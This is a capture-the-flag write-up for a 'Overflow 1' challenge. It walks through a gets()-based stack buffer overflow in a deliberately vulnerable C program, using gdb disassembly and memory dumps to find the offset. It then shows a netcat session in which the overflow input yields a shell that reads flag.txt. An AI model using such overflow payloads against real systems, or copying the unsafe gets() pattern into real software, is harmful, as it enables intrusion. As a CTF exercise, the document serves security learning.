# Overflow 1

## Task

ez overflow.

nc cyberyoddha.baycyber.net 10001

## Solution

```bash
$ file Overflow1
Overflow1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=134858815bafb8d0abdb1cafeea2a7cae346d528, for GNU/Linux 3.2.0, with debug_info, not stripped
```

We also have the source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  char str[] = "AAAA";
  char buf[16];

  gets(buf);

  if (!(str[0] == 'A' && str[1] == 'A' && str[2] == 'A' && str[3] == 'A')){
    system("/bin/sh");
  }
}
```

The task is now to overflow `buf` to overwrite `str` on the stack.

```bash
$ ./checksec --file=Overflow1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70) Symbols       No    0               1               Overflow1
```

We can compile our own overflow file and debug it with gdb, put a breakpoint at the first comp and see where each variable is stored:

```bash
$ gcc overflow1.c -o overflow -fno-stack-protector -no-pie
$ gdb overflow
```

```nasm
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:     push   %rbp
   0x0000000000401137 <+1>:     mov    %rsp,%rbp
   0x000000000040113a <+4>:     sub    $0x20,%rsp
   0x000000000040113e <+8>:     movl   $0x41414141,-0x5(%rbp)
   0x0000000000401145 <+15>:    movb   $0x0,-0x1(%rbp)
   0x0000000000401149 <+19>:    lea    -0x20(%rbp),%rax
   0x000000000040114d <+23>:    mov    %rax,%rdi
   0x0000000000401150 <+26>:    mov    $0x0,%eax
   0x0000000000401155 <+31>:    callq  0x401040 <gets@plt>
   0x000000000040115a <+36>:    movzbl -0x5(%rbp),%eax
   0x000000000040115e <+40>:    cmp    $0x41,%al
   0x0000000000401160 <+42>:    jne    0x40117a <main+68>
   0x0000000000401162 <+44>:    movzbl -0x4(%rbp),%eax
   0x0000000000401166 <+48>:    cmp    $0x41,%al
   0x0000000000401168 <+50>:    jne    0x40117a <main+68>
   0x000000000040116a <+52>:    movzbl -0x3(%rbp),%eax
   0x000000000040116e <+56>:    cmp    $0x41,%al
   0x0000000000401170 <+58>:    jne    0x40117a <main+68>
   0x0000000000401172 <+60>:    movzbl -0x2(%rbp),%eax
   0x0000000000401176 <+64>:    cmp    $0x41,%al
   0x0000000000401178 <+66>:    je     0x401186 <main+80>
   0x000000000040117a <+68>:    lea    0xe83(%rip),%rdi        # 0x402004
   0x0000000000401181 <+75>:    callq  0x401030 <system@plt>
   0x0000000000401186 <+80>:    mov    $0x0,%eax
   0x000000000040118b <+85>:    leaveq
   0x000000000040118c <+86>:    retq
```

We want to stop at `<+40>` so we do a `b *0x40115e` and hit `r`, enter 16 `B` and do a `x/64x` on the register value of `rbp`, our base pointer, minus 0x20 (our stack size from instruction `<+4>`) or of rsp.

```
(gdb) info register rbp
rbp            0x7fffffffe1d0      0x7fffffffe1d0
(gdb) info register rsp
rsp            0x7fffffffe1b0      0x7fffffffe1b0
(gdb) x/64x 0x7fffffffe1d0-0x20
0x7fffffffe1b0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe1c0: 0xffffe200      0x00007fff      0x41000000      0x00414141`
```

We now can see that we just have to enter 11 more values to overwrite the first `A` to get past the comparison. Why 11, not 12? Because there is a null byte at the end of our input. See `man 3 gets`:

`gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').`

Let's test this:

```bash
$ nc cyberyoddha.baycyber.net 10001
BBBBBBBBBBBBBBBBBBBBBBBBBBB
ls
flag.txt
overflow1
cat flag.txt
CYCTF{st@ck_0v3rfl0ws_@r3_3z}
```
